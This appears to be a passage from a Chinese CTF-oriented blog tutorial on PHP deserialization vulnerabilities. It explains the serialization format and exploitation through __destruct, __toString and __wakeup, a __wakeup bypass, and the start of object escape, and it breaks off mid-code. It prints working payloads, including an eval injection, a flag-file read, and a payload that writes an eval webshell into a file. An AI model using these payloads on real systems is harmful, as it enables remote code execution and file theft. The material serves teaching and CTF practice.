class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class object&#123;</span><br><span class=\"line\">    public $team = &#x27;joker&#x27;;</span><br><span class=\"line\">    private $team_name = &#x27;hahaha&#x27;;</span><br><span class=\"line\">    protected $team_group = &#x27;biubiu&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">    function hahaha()&#123;</span><br><span class=\"line\">        $this-&gt;$team_members = &#x27;奥力给&#x27;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$object = new object();</span><br><span class=\"line\">echo serialize($object);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">O:6:&quot;object&quot;:3:&#123;s:4:&quot;team&quot;;s:5:&quot;joker&quot;;s:17:&quot;objectteam_name&quot;;s:6:&quot;hahaha&quot;;s:13:&quot;*team_group&quot;;s:6:&quot;biubiu&quot;;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">如果我们使用urlencode输出时</span><br><span class=\"line\">O%3A6%3A%22object%22%3A3%3A%7Bs%3A4%3A%22team%22%3Bs%3A5%3A%22joker%22%3Bs%3A17%3A%22%00object%00team_name%22%3Bs%3A6%3A%22hahaha%22%3Bs%3A13%3A%22%00%2A%00team_group%22%3Bs%3A6%3A%22biubiu%22%3B%7D</span><br><span class=\"line\"></span><br><span class=\"line\">就能很明显的看到%00和*了</span><br><span class=\"line\"></span><br><span class=\"line\">以上是序列化之后的结果，o代表是一个对象，6是对象object的长度，3的意思是有三个类属性，后面花括号里的是类属性的内容，s表示的是类属性team的类型，4表示类属性team的长度，后面的以此类推。</span><br><span class=\"line\"></span><br><span class=\"line\">值得一提的是，类方法并不会参与到实例化里面。</span><br></pre></td></tr></table></figure>\n<p>序列化格式中的字母含义：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a - array                    b - boolean  </span><br><span class=\"line\">d - double                   i - integer</span><br><span class=\"line\">o - common object            r - reference</span><br><span class=\"line\">s - string                   C - custom object</span><br><span class=\"line\">O - class                  N - null</span><br><span class=\"line\">R - pointer reference      U - unicode string</span><br></pre></td></tr></table></figure>\n<h4 id=\"反序列化\"><a class=\"markdownIt-Anchor\" href=\"#反序列化\">#</a> 反序列化</h4>\n<p>反序列化的话，就依次根据规则进行反向复原。</p>\n<p>这边定义一个字符串，然后使用反序列化函数 unserialize 进行反序列化处理，最后使用 var_dump 进行输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    $ser = &#x27;O:6:&quot;object&quot;:3:&#123;s:1:&quot;a&quot;;i:1;s:4:&quot;team&quot;;s:6:&quot;hahaha&quot;;&#125;&#x27;;</span><br><span class=\"line\">    $ser = unserialize($ser);</span><br><span class=\"line\">    echo &#x27;&lt;pre&gt;&#x27;;</span><br><span class=\"line\">    var_dump($ser);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">object(__PHP_Incomplete_Class)#1 (3) &#123;</span><br><span class=\"line\">  [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt;</span><br><span class=\"line\">  string(6) &quot;object&quot;</span><br><span class=\"line\">  [&quot;a&quot;]=&gt;</span><br><span class=\"line\">  int(1)</span><br><span class=\"line\">  [&quot;team&quot;]=&gt;</span><br><span class=\"line\">  string(6) &quot;hahaha&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用\"><a class=\"markdownIt-Anchor\" href=\"#利用\">#</a> 利用：</h3>\n<p>在反序列化过程中，其功能就类似于创建了一个新的对象（复原一个对象可能更恰当），并赋予其相应的属性值。如果<strong>让攻击者操纵任意反序列数据</strong>， 那么攻击者就可以实现任意类对象的创建，如果一些类存在一些自动触发的方法（魔术方法），那么就有可能以此为跳板进而攻击系统应用。</p>\n<p>挖掘反序列化漏洞的条件是：</p>\n<blockquote>\n<p>1. 代码中有可利用的类，并且类中有__wakeup ()，__sleep ()，__destruct () 这类特殊条件下可以自己调用的魔术方法。</p>\n<p>2. unserialize () 函数的参数可控。</p>\n</blockquote>\n<h4 id=\"0x00-__destruct利用\"><a class=\"markdownIt-Anchor\" href=\"#0x00-__destruct利用\">#</a> 0x00 __destruct () 利用</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class A&#123;</span><br><span class=\"line\">    var $test = &quot;demo&quot;;</span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        @eval($this-&gt;test);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$test = $_POST[&#x27;test&#x27;];</span><br><span class=\"line\">$len = strlen($test)+1;</span><br><span class=\"line\">$p = &quot;O:1:\\&quot;A\\&quot;:1:&#123;s:4:\\&quot;test\\&quot;;s:&quot;.$len.&quot;:\\&quot;&quot;.$test.&quot;;\\&quot;;&#125;&quot;; // 构造序列化对象</span><br><span class=\"line\">$test_unser = unserialize($p); // 反序列化同时触发_destruct函数</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">//利用同名变量覆盖和还原对象 可以理解为$test = $_POST[&#x27;test&#x27;],复原时还需要有对应的变量值的length</span><br><span class=\"line\">//由于destruct会在对象销毁时自动调用，我们只需要传入对应的恶意外码即可，题目已经帮我们构造好了序列化后的代码</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">post:</span><br><span class=\"line\">test=phpinfo();</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>如上代码，最终的目的是通过调用__destruct () 这个析构函数，将恶意的 payload 注入，导致代码执行。根据上面的魔术方法的介绍，当程序跑到 unserialize () 反序列化的时候，会触发__destruct () 方法，同时也可以触发__wakeup () 方法。但是如果想注入恶意 payload，还需要对<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>e</mi><mi>s</mi><mi>t</mi><mtext>的值进行覆盖，题目中已经给出了序列化链，很明显是对类</mtext><mi>A</mi><mtext>的</mtext></mrow><annotation encoding=\"application/x-tex\">test的值进行覆盖，题目中已经给出了序列化链，很明显是对类A的</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">t</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">值</span><span class=\"mord cjk_fallback\">进</span><span class=\"mord cjk_fallback\">行</span><span class=\"mord cjk_fallback\">覆</span><span class=\"mord cjk_fallback\">盖</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">题</span><span class=\"mord cjk_fallback\">目</span><span class=\"mord cjk_fallback\">中</span><span class=\"mord cjk_fallback\">已</span><span class=\"mord cjk_fallback\">经</span><span class=\"mord cjk_fallback\">给</span><span class=\"mord cjk_fallback\">出</span><span class=\"mord cjk_fallback\">了</span><span class=\"mord cjk_fallback\">序</span><span class=\"mord cjk_fallback\">列</span><span class=\"mord cjk_fallback\">化</span><span class=\"mord cjk_fallback\">链</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">很</span><span class=\"mord cjk_fallback\">明</span><span class=\"mord cjk_fallback\">显</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">对</span><span class=\"mord cjk_fallback\">类</span><span class=\"mord mathnormal\">A</span><span class=\"mord cjk_fallback\">的</span></span></span></span> test 变量进行覆盖。</p>\n</blockquote>\n<h4 id=\"0x01-__tostring利用\"><a class=\"markdownIt-Anchor\" href=\"#0x01-__tostring利用\">#</a> 0x01 __tostring () 利用</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//index.php</span><br><span class=\"line\">&lt;?php </span><br><span class=\"line\">$txt = $_GET[&quot;txt&quot;]; </span><br><span class=\"line\">$file = $_GET[&quot;file&quot;]; </span><br><span class=\"line\">$password = $_GET[&quot;password&quot;]; </span><br><span class=\"line\">if(isset($txt)&amp;&amp;(file_get_contents($txt,&#x27;r&#x27;)===&quot;welcome to the bugkuctf&quot;))</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    echo &quot;hello friend!&lt;br&gt;&quot;; </span><br><span class=\"line\">    if(preg_match(&quot;/flag/&quot;,$file))</span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">       echo &quot;不能现在就给你flag哦&quot;; </span><br><span class=\"line\">       exit(); </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else</span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">       include($file); </span><br><span class=\"line\">       $password = unserialize($password); </span><br><span class=\"line\">       echo $password; </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">       echo &quot;you are not the number of bugku ! &quot;; </span><br><span class=\"line\">&#125; </span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//hint.php</span><br><span class=\"line\">&lt;?php  </span><br><span class=\"line\">class Flag&#123;//flag.php  </span><br><span class=\"line\">    public $file;  </span><br><span class=\"line\">    public function __tostring()&#123;  </span><br><span class=\"line\">        if(isset($this-&gt;file))&#123;  </span><br><span class=\"line\">            echo file_get_contents($this-&gt;file); </span><br><span class=\"line\">            echo &quot;&lt;br&gt;&quot;;</span><br><span class=\"line\">            return (&quot;good&quot;);</span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">payload:</span><br><span class=\"line\">?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>hint.php 文件中使用了魔术方法__tostring () 方法，当一个对象被当作一个字符串被调用时即可触发，方法的主要作用是读取并打印传进来的 $file，估计是通过反序列化漏洞来读取 flag.php 的内容。追踪以下调用链，在 index.php 文件中发现使用 echo 将反序列化的对象当作字符串打印，此处就会触发__tostring () 方法，并且 unserialize () 内的变量可控，满足反序列化漏洞条件。</p>\n</blockquote>\n<h4 id=\"0x02-__wakeup利用\"><a class=\"markdownIt-Anchor\" href=\"#0x02-__wakeup利用\">#</a> 0x02 __wakeup () 利用</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class test&#123;</span><br><span class=\"line\">    var $test = &#x27;123&#x27;;</span><br><span class=\"line\">    function __wakeup()&#123;</span><br><span class=\"line\">        $fp = fopen(&quot;flag.php&quot;,&quot;w&quot;);</span><br><span class=\"line\">        fwrite($fp,$this-&gt;test);</span><br><span class=\"line\">        fclose($fp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a = $_GET[&#x27;id&#x27;];</span><br><span class=\"line\">print_r($a);</span><br><span class=\"line\">echo &quot;&lt;/br&gt;&quot;;</span><br><span class=\"line\">$a_unser = unserialize($a);</span><br><span class=\"line\">require &quot;flag.php&quot;;</span><br><span class=\"line\">?&gt;     </span><br><span class=\"line\"></span><br><span class=\"line\">pyload:</span><br><span class=\"line\">?id=O:4:&quot;test&quot;:1:&#123;s:4:&quot;test&quot;;s:27:&quot;&lt;?php eval($_GET[&#x27;sb&#x27;]); ?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class test&#123;</span><br><span class=\"line\">    var $test = &quot;&lt;?php eval($_GET[&#x27;sb&#x27;]); ?&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$test = new test();</span><br><span class=\"line\">echo serialize($test);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>通过调用魔术方法__wakeup 将 $test 的值写入 flag.php 文件中，当调用 unserialize () 反序列化操作时会触发__wakeup 魔术方法，接下来就需要构造传进去的 payload</p>\n<p>在执行 unserialize () 方法时会触发__wakeup () 方法执行，将传入的字符串反序列化后，会替换掉 test 类里面 $test 变量的值，将 php 探针写入 flag.php 文件中，并通过下面的 require 引用，导致命令执行。</p>\n</blockquote>\n<h4 id=\"0x03-__wakeup绕过\"><a class=\"markdownIt-Anchor\" href=\"#0x03-__wakeup绕过\">#</a> 0x03 __wakeup () 绕过</h4>\n<p>极客大挑战 2019 PHP</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//index.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"string\">&#x27;class.php&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$select</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;select&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$res</span>=<span class=\"title function_ invoke__\">unserialize</span>(@<span class=\"variable\">$select</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//class.php</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">&#x27;flag.php&#x27;</span>;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span> = <span class=\"string\">&#x27;nonono&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span> = <span class=\"string\">&#x27;yesyes&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"string\">&#x27;guest&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;password != <span class=\"number\">100</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You name is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;username;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;You password is: &quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;password;<span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;username === <span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">global</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"variable\">$flag</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>();            </span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$username</span>,<span class=\"variable\">$password</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;username = <span class=\"variable\">$username</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;password = <span class=\"variable\">$password</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Name</span>(<span class=\"string\">&#x27;admin&#x27;</span>,<span class=\"number\">100</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Nameusername&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Namepassword&quot;</span>;i:<span class=\"number\">100</span>;&#125;</span><br><span class=\"line\">O%<span class=\"number\">3</span>A4%<span class=\"number\">3</span>A%<span class=\"number\">22</span>Name%<span class=\"number\">22</span>%<span class=\"number\">3</span>A2%<span class=\"number\">3</span>A%<span class=\"number\">7</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>username%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A5%<span class=\"number\">3</span>A%<span class=\"number\">22</span>admin%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>password%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bi%<span class=\"number\">3</span>A100%<span class=\"number\">3</span>B%<span class=\"number\">7</span>D</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">//其实你这么写也行~</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$username</span>=<span class=\"string\">&#x27;admin&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"variable\">$password</span>=<span class=\"number\">100</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Name</span>();</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>));</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">O:<span class=\"number\">4</span>:<span class=\"string\">&quot;Name&quot;</span>:<span class=\"number\">3</span>:&#123;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Nameusername&quot;</span>;s:<span class=\"number\">5</span>:<span class=\"string\">&quot;admin&quot;</span>;s:<span class=\"number\">14</span>:<span class=\"string\">&quot;Namepassword&quot;</span>;i:<span class=\"number\">100</span>;&#125;</span><br><span class=\"line\">O%<span class=\"number\">3</span>A4%<span class=\"number\">3</span>A%<span class=\"number\">22</span>Name%<span class=\"number\">22</span>%<span class=\"number\">3</span>A2%<span class=\"number\">3</span>A%<span class=\"number\">7</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>username%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A5%<span class=\"number\">3</span>A%<span class=\"number\">22</span>admin%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bs%<span class=\"number\">3</span>A14%<span class=\"number\">3</span>A%<span class=\"number\">22</span>%<span class=\"number\">00</span>Name%<span class=\"number\">00</span>password%<span class=\"number\">22</span>%<span class=\"number\">3</span>Bi%<span class=\"number\">3</span>A100%<span class=\"number\">3</span>B%<span class=\"number\">7</span>D</span><br></pre></td></tr></table></figure>\n<p><strong>当成员属性数目大于实际数目时可绕过 wakeup 方法</strong>，其次 private 的 %00 是老生常谈了。多说一句，这是一个 CVE 漏洞</p>\n<h4 id=\"0x04对象逃逸\"><a class=\"markdownIt-Anchor\" href=\"#0x04对象逃逸\">#</a> 0x04 对象逃逸</h4>\n<p>当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生 PHP 反序列化字符逃逸的漏洞。</p>\n<p>对于 PHP 反序列字符逃逸，我们分为以下两种情况进行讨论。</p>\n<ul>\n<li>过滤后字符变多</li>\n<li>过滤后字符变少</li>\n</ul>\n<h5 id=\"过滤后字符变多\"><a class=\"markdownIt-Anchor\" href=\"#过滤后字符变多\">#</a> 过滤后字符变多</h5>\n<p>设我们先定义一个<strong> user</strong> 类，然后里面一共有 3 个成员变量：<strong>username</strong>、<strong>password</strong>、<strong>isVIP</strong>。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span 